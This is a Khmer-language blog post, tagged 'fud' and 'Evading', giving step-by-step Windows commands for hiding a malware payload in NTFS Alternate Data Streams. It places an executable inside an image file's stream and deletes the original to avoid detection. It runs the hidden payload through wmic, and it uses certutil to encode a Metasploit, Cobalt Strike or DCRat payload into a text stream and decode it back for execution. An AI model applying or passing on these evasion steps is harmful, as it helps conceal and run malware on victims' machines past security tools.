---
title: "Malicious Alternate Data Streams In Windows"
date: 2023-07-05T21:01:06+07:00
description: លាក់ទិន្នន័យសំងាត់ក្នុងវីនដូ Data Steams
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- fud
- data-streams
categories:
- Evading
series:
- WinExE
image: images/feature3/terminal.gif
---

ខាងក្រោមជាវិធីសាស្ត្រក្នុងការលាក់ ផេឡូតនៅក្នុងឯកសារផ្សេងៗ។ ចំពោះកាបង្ហាញខាងក្រោមខ្ញុំនឹងសាកល្បងលាក់នៅក្នុងឯកសាររូបភាព (jpg, png, gif, etc.) ។

### Hide Payload Inside Image File

នៅក្នុងវីនដូសូមវាយពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight cmd "linenos=table" >}}
type payload.exe > imagefile.png:payload.exe
{{< / highlight >}}

ក្រោយពីលាក់រួចយើងអាចពិនិត្យមើល ADS បានដោយប្រើពាក្យបញ្ជា <span style="color:grey;">dir /r</span> ។

សូមធ្វើការលុបឯកសាមេរោគដើមចេញ ជៀសវៀងពីការរកឃើញ៖

{{< highlight cmd "linenos=table" >}}
del payload.exe
{{< / highlight >}}

ដើម្បីដំណើរការ payload យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight cmd "linenos=table" >}}
wmic.exe process call create "C:\ProgramData\imagefile.png:payload.exe"
{{< / highlight >}}

រួចរាល់ ។

### Hide Payload Through Certutil

ជាគោលគំនិតក្នុងការលាក់ Payload ក្នុង ADS ដោយប្រើប្រាស់ [Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) ។

#### Generate ADS
ខាងក្រោមជាដំណើរការក្នុងការលាក់ Payload Strings នៅក្នុង ADS ដោយប្រើប្រាស់ពាក្យបញ្ជាដែលមានស្រាប់ក្នុង Powershell ។

បើកផ្ទាំង CMD រួចវាយពាក្យបញ្ជាខាងក្រោម៖

{{< highlight cmd "linenos=table" >}}
echo payload > hello.txt:payload.bin
{{< / highlight >}}

ពាក្យ payload នឹងរក្សាទុកនៅក្នុង ADS ដែលមានឈ្មោះថា payload.bin ។ ដើម្បីកែប្រែវាវិញយើងអាចប្រើប្រាស់កម្មវិធី Notepad ដើម្បីបើកមើលនិងកែប្រែវាបាន ដោយវាយពាក្យបញ្ជាដូចខាងក្រោម៖

{{< highlight cmd "linenos=table" >}}
notepad hello.txt:payload.bin
{{< / highlight >}}

![Generate ADS](/en/posts/img/2023/07/ads-with-certutil/generate-ads.png)

#### Certutil

បង្កើត Payload ដោយប្រើប្រាស់ Metasploit / Cobalt Strike / DCRat ។ល។ បន្ទាប់មកធ្វើវាឲ្យទៅជា Cert File ដោយវាយពាក្យបញ្ជានៅក្នុង Powershell ដូចខាងក្រោម៖

{{< highlight powershell "linenos=table" >}}
certutil -encode ./payload.exe payload.txt
{{< / highlight >}}

![Encode Certutil Payload](/en/posts/img/2023/07/ads-with-certutil/certutil-payload.png)

បន្ទាប់មកចម្លងនិងរក្សាទុកនូវចំនួនអក្សរដែលមានក្នុងឯកសារ payload.txt ទាំងអស់ចូលទៅក្នុងឯកសារ payload.bin ដែលបានបើកឡើងក្នុងដំណាក់កាលទី ១ ។

![Decode Certutil Payload](/en/posts/img/2023/07/ads-with-certutil/decode-certutil.png)

#### PWN The Payload

ដើម្បីត្រលប់ឯកសារមេរោគដែលលាក់នៅក្នុងឯកសារ ADS(payload.bin) យើងអាចប្រើប្រាស់ពាក្យបញ្ជានៅក្នុង Powershell ដូចខាងក្រោម៖

{{< highlight powershell "linenos=table" >}}
certutil -decode hello.txt:payload.bin payload.exe
{{< / highlight >}}

រួចរាល់ពេលនេះយើងអាចត្រលប់ឯកសារមេរោគនោះនិងអាចដំណើរការវាបានដូចធម្មតា ៕

![PWN](/en/posts/img/2023/07/ads-with-certutil/pwn.png)

<b>លំអិតអំពី៖</b> [ADS](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams)
<b>ឯកសារទាក់ទង៖</b> [Malwarebytes](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams), [Netwrix](https://blog.netwrix.com/2022/12/16/alternate_data_stream/), [Minitool](https://www.minitool.com/partition-disk/alternate-data-streams.html)